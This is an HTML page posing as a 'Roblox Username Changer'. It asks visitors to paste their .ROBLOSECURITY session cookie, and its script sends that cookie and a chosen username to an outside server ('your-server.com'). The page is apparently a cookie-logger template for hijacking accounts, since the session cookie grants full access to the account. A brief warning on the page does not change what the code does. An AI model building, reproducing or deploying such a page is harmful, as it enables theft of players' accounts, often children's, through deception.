<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Username Changer</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
        textarea { width: 100%; height: 100px; margin-bottom: 10px; }
        button { padding: 10px 15px; background: #4CAF50; color: white; border: none; cursor: pointer; }
        #status { margin-top: 10px; padding: 10px; display: none; }
        .success { background: #dff0d8; color: #3c763d; }
        .error { background: #f2dede; color: #a94442; }
    </style>
</head>
<body>
    <h1>Roblox Username Changer</h1>
    <p><strong>Warning:</strong> This will use your Roblox cookie to change your username.</p>
    
    <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
    <input type="text" id="newUsername" placeholder="New username">
    <button onclick="submitCookie()">Change Username</button>
    
    <div id="status"></div>

    <script>
        async function submitCookie() {
            const cookie = document.getElementById("cookieInput").value.trim();
            const newUsername = document.getElementById("newUsername").value.trim();
            const statusEl = document.getElementById("status");

            if (!cookie || !newUsername) {
                statusEl.textContent = "Please fill all fields!";
                statusEl.className = "error";
                statusEl.style.display = "block";
                return;
            }

            try {
                const response = await fetch("https://your-server.com/change-username", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ cookie, newUsername }),
                });

                const result = await response.json();
                
                if (result.success) {
                    statusEl.textContent = "Username changed successfully!";
                    statusEl.className = "success";
                } else {
                    statusEl.textContent = "Error: " + (result.error || "Failed to change username.");
                    statusEl.className = "error";
                }
            } catch (err) {
                statusEl.textContent = "Network error: " + err.message;
                statusEl.className = "error";
            }
            
            statusEl.style.display = "block";
        }
    </script>
</body>
</html>
